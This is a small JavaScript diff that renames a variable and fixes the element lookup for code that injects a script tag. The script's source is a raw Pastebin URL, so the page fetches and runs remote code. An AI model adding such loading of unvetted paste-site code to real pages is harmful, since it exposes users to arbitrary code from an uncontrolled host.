@@ -1,5 +1,3 @@
-document.body.id="frame"
-
 const script = document.createElement('script');
 script.src = 'https://pastebin.com/raw/BAE0GeBY';
 
@@ -12,6 +10,6 @@ script.onerror = function error() {
     console.log('Error loading script!')
 };
 
-const frame = document.body.getElementById('2fort');
+const framee = document.getElementById('box');
 
-frame.appendChild(script);
+framee.appendChild(script);
